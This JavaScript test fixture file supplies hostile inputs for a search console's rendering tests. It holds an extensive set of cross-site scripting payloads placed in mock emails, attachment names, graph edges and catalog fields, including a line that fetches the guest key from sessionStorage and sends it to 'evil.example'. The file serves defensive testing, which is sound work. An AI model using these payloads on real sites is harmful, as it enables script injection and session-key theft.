// ============================================================
// Hostile fixtures for the corpus home, the reader and the guest shell.
//
// Every string here is something a stranger can put into YOUR index by
// mailing you, by naming an attachment, or by writing a file you later point
// `xerj brain` at. Each payload, if it ever executed, sets
// `window.__xerjPwned` (and most also try to read the guest key out of
// sessionStorage) — the browser tests assert that flag is never set, that no
// dialog opens, and that no request leaves for `evil.example`.
//
// Shared by the node tests (pure render → node tree) and the browser tests
// (real Chrome, real DOM). `.mjs` on purpose: xerj-console-api/build.rs
// bundles every `.js` / `.html` under xerj-ux/ into the server binary.
// ============================================================

const PWN = "window.__xerjPwned=(window.__xerjPwned||0)+1;fetch('https://evil.example/k?'+sessionStorage.getItem('xerj.share'))";

export const PAYLOADS = {
  script:        `<script>${PWN}</script>`,
  imgOnerror:    `<img src=x onerror="${PWN}">`,
  svgOnload:     `<svg onload="${PWN}"><animate onbegin="${PWN}" attributeName=x dur=1s></svg>`,
  svgScript:     `<svg><script>${PWN}</script></svg>`,
  iframeSrcdoc:  `<iframe srcdoc="<script>parent.__xerjPwned=1</script>"></iframe>`,
  iframeJs:      `<iframe src="javascript:${PWN}"></iframe>`,
  attrBreakout:  `"><img src=x onerror=${PWN}>`,
  attrBreakout1: `'><svg/onload=${PWN}>`,
  eventAttr:     `" onmouseover="${PWN}" autofocus onfocus="${PWN}" x="`,
  jsUrl:         `javascript:${PWN}`,
  jsUrlObf:      ` \tjava\nscript:${PWN}`,
  dataUrl:       `data:text/html,<script>${PWN}</script>`,
  vbUrl:         `vbscript:msgbox(1)`,
  anchor:        `<a href="javascript:${PWN}">click me</a>`,
  mdLink:        `[click](javascript:${PWN})`,
  style:         `<style>*{background:url("https://evil.example/css")}</style>`,
  linkTag:       `<link rel=stylesheet href="https://evil.example/x.css">`,
  metaRefresh:   `<meta http-equiv="refresh" content="0;url=https://evil.example/">`,
  base:          `<base href="https://evil.example/">`,
  form:          `<form action="https://evil.example/"><input name=k><button>go</button></form>`,
  object:        `<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/y">`,
  template:      '${' + PWN + '}{{constructor.constructor("' + PWN + '")()}}',
  entity:        `&lt;img src=x onerror=${PWN}&gt;`,
  mathml:        `<math><mtext><table><mglyph><style><img src=x onerror=${PWN}>`,
  details:       `<details open ontoggle="${PWN}">x</details>`,
};

export const ALL_PAYLOADS = Object.values(PAYLOADS).join('\n');

// U+E000 / U+E001 — the reader's highlight delimiters (ux/safe-dom.js).
export const HL_PRE = String.fromCharCode(0xe000);
export const HL_POST = String.fromCharCode(0xe001);

/** Highlight fragments an attacker shapes by choosing the document text —
 *  including forging the delimiters themselves. */
export const HOSTILE_FRAGMENTS = [
  `${HL_PRE}invoice${HL_POST} ${PAYLOADS.imgOnerror}`,
  `${HL_PRE}${PAYLOADS.script}${HL_POST}`,
  `</mark>${PAYLOADS.svgOnload}<mark>${HL_PRE}x${HL_POST}`,
  `${HL_PRE}unterminated ${PAYLOADS.imgOnerror}`,
  `${HL_POST}reversed${HL_PRE} ${PAYLOADS.attrBreakout}`,
  `${HL_PRE}${HL_PRE}nested${HL_POST}${HL_POST} ${PAYLOADS.iframeJs}`,
  `<em>${PAYLOADS.imgOnerror}</em> default-tag fragment`,
];

export const HOSTILE_ID = `m1"><img src=x onerror=${PWN}>`;

export const hostileEmail = {
  _index: 'ax-inbox',
  _id: HOSTILE_ID,
  _score: 3.2,
  _source: {
    email_subject: `Overdue invoice ${PAYLOADS.script}${PAYLOADS.imgOnerror}`,
    email_from: `Mallory ${PAYLOADS.svgOnload} <mallory@evil.example>`,
    email_to: [`you@example.com`, PAYLOADS.attrBreakout],
    email_cc: PAYLOADS.eventAttr,
    email_date: `2026-09-01T10:00:00Z${PAYLOADS.attrBreakout1}`,
    email_message_id: `<id-1@evil.example>${PAYLOADS.iframeSrcdoc}`,
    email_in_reply_to: PAYLOADS.jsUrl,
    ax_path: `inbox/${PAYLOADS.attrBreakout}.eml`,
    ax_format: `eml${PAYLOADS.imgOnerror}`,
    // An HTML email whose markup reached the index as text.
    body: `<html><body onload="${PWN}">Dear customer,\n${ALL_PAYLOADS}\nClick https://evil.example/pay or ${PAYLOADS.jsUrl}\n</body></html>`,
  },
  highlight: { body: HOSTILE_FRAGMENTS.slice(0, 3), email_subject: HOSTILE_FRAGMENTS.slice(3) },
};

export const hostileAttachment = {
  _index: 'ax-inbox',
  _id: 'att-1',
  _score: 1.1,
  _source: {
    attachment_name: `"><img src=x onerror=${PWN}>.pdf`,
    attachment_content_type: `application/pdf${PAYLOADS.script}`,
    attachment_bytes: `1024${PAYLOADS.imgOnerror}`,
    page: 2,
    email_message_id: hostileEmail._source.email_message_id,
    email_from: hostileEmail._source.email_from,
    email_subject: hostileEmail._source.email_subject,
    email_date: '2026-09-01T10:00:00Z',
    body: `Page two.\n${PAYLOADS.svgScript}\n${PAYLOADS.anchor}\n${PAYLOADS.mdLink}`,
  },
};

export const hostileAttachment2 = {
  _index: 'ax-inbox',
  _id: 'att-2',
  _score: 1.0,
  _source: {
    attachment_name: `javascript:${PWN}//.html`,
    attachment_content_type: 'text/html',
    attachment_bytes: 77,
    email_message_id: hostileEmail._source.email_message_id,
    email_from: hostileEmail._source.email_from,
  },
};

export const hostilePdf = {
  _index: 'ax-inbox', _id: 'pdf-1', _score: 0.9,
  _source: { page: 1, title: `Contract ${PAYLOADS.details}`, ax_path: `docs/${PAYLOADS.base}.pdf`, ax_format: 'pdf', body: ALL_PAYLOADS },
};

export const hostileCode = {
  _index: 'ax-inbox', _id: 'sym-1', _score: 0.8,
  _source: { name: `run${PAYLOADS.script}`, kind: `fn${PAYLOADS.imgOnerror}`, language: `rust${PAYLOADS.svgOnload}`, line: `7${PAYLOADS.attrBreakout}`, path: `src/${PAYLOADS.attrBreakout}.rs`, code: `fn run() { /* ${ALL_PAYLOADS} */ }` },
};

export const hostileGeneric = {
  _index: 'ax-inbox', _id: 'gen-1', _score: 0.7,
  _source: { [`key${PAYLOADS.imgOnerror}`]: PAYLOADS.script, nested: { [PAYLOADS.attrBreakout]: [PAYLOADS.svgOnload] }, body_vector: [0.1, 0.2] },
};

/** The per-FILE record autoindex writes (`ax_locator: "file"`, no text): what
 *  file-level graph edges point at. Its path is a filename — attacker-chosen. */
export const HOSTILE_AX_FILE = 'axf2-hostile-0001';
export const hostileFile = {
  _index: 'ax-inbox', _id: 'file-1', _score: 0.6,
  _source: { title: `05${PAYLOADS.script}.eml`, ax_path: `inbox/${PAYLOADS.attrBreakout}.eml`, ax_file: HOSTILE_AX_FILE, ax_locator: 'file', ax_format: `eml${PAYLOADS.imgOnerror}`, ax_dataset: 'docs' },
};
hostileEmail._source.ax_file = HOSTILE_AX_FILE;
hostileEmail._source.ax_locator = 'msg-s0';
// …and its attachments, as extract/eml.rs numbers them: every record of one
// .eml shares the file's `ax_file`; the locator carries the attachment ordinal.
hostileAttachment._source.ax_file = HOSTILE_AX_FILE;
hostileAttachment._source.ax_locator = 'att0-p2-s0';
hostileAttachment2._source.ax_file = HOSTILE_AX_FILE;
hostileAttachment2._source.ax_locator = 'att1-card';

export const HOSTILE_HITS = [hostileEmail, hostileAttachment, hostileAttachment2, hostilePdf, hostileCode, hostileGeneric, hostileFile];

/** `GET /_graph/{brain}/ego` — every string a linked FILE controls. */
export const hostileEgo = {
  node: HOSTILE_ID,
  edges: [
    { src: HOSTILE_ID, dst: 'att-1', type: `shared_term`, hop: 1, edge_id: 'e1', weight: 1 },
    { src: 'pdf-1', dst: HOSTILE_ID, type: `<img src=x onerror=${PWN}>`, hop: 1, edge_id: `e2"><script>${PWN}</script>`, weight: 0.5 },
    { src: HOSTILE_ID, dst: `javascript:${PWN}`, type: 'href', hop: 1, edge_id: 'e3' },
  ],
  nodes: {
    'att-1': { index: 'ax-inbox', title: PAYLOADS.script, path: PAYLOADS.attrBreakout, preview: ALL_PAYLOADS },
    'pdf-1': { index: `other-index"><img src=x onerror=${PWN}>`, title: PAYLOADS.svgOnload, preview: PAYLOADS.iframeJs },
    [`javascript:${PWN}`]: { title: PAYLOADS.jsUrl, preview: PAYLOADS.dataUrl },
  },
  not_shown: { edges_clipped: 0, frontier_clipped: 0, dangling_nodes: 0 },
};

/** An `autoindex-catalog` dataset document whose every free-text value is
 *  document-derived (sample queries come from the corpus's own terms, field
 *  examples are document values, a format is a file extension). */
export const hostileCatalogHit = {
  _index: 'autoindex-catalog',
  _id: 'dataset-ax-inbox',
  _source: {
    doc_kind: 'dataset',
    index_name: 'ax-inbox',
    slug: `inbox${PAYLOADS.imgOnerror}`,
    formats: ['eml', `pdf${PAYLOADS.script}`],
    record_count: 6, file_count: 3, bytes: 123456, junk_records: 1,
    time_field: `email_date${PAYLOADS.attrBreakout}`,
    time_min: `2026-01-01${PAYLOADS.imgOnerror}`, time_max: '2026-09-01',
    semantic_field: `body${PAYLOADS.svgOnload}`,
    fields_json: JSON.stringify([
      { name: `email_from${PAYLOADS.imgOnerror}`, es_type: `keyword${PAYLOADS.script}`, coverage: 1, examples: [PAYLOADS.attrBreakout, PAYLOADS.eventAttr] },
      { name: 'body', es_type: 'semantic_text', semantic: true, coverage: 1, examples: [PAYLOADS.script] },
    ]),
    sample_queries_json: [
      JSON.stringify({ class: 'fulltext', title: `T ${PAYLOADS.attrBreakout}`, request: 'POST /ax-inbox/_search', body: { query: { match: { body: `invoice ${PAYLOADS.imgOnerror}` } } } }),
      JSON.stringify({ class: 'term', title: 't', body: { query: { term: { email_from: `x"}]});${PWN}//` } } } }),
      // A sample written for a field the Reader would not search on its own
      // (a keyword that is not title-like): its field must ride along.
      JSON.stringify({ class: 'fulltext', title: 'by format', body: { query: { match: { ax_format: 'samplefieldword' } }, size: 3 } }),
    ],
    notes: [PAYLOADS.script],
  },
};

/** Text an engine puts in a 403 body — names the resource and the grant that
 *  would fix it. A guest must never be shown any of it. */
export const ENGINE_403_BODY = {
  error: {
    type: 'security_exception',
    reason: 'action [indices:data/read/search] is unauthorized for API key id [SECRET-KEY-ID-7731] on indices [hr-salaries-2026], this action is granted by the index privileges [read]',
  },
  status: 403,
};
export const LEAK_MARKERS = ['SECRET-KEY-ID-7731', 'hr-salaries-2026', 'security_exception', 'granted by the index privileges'];
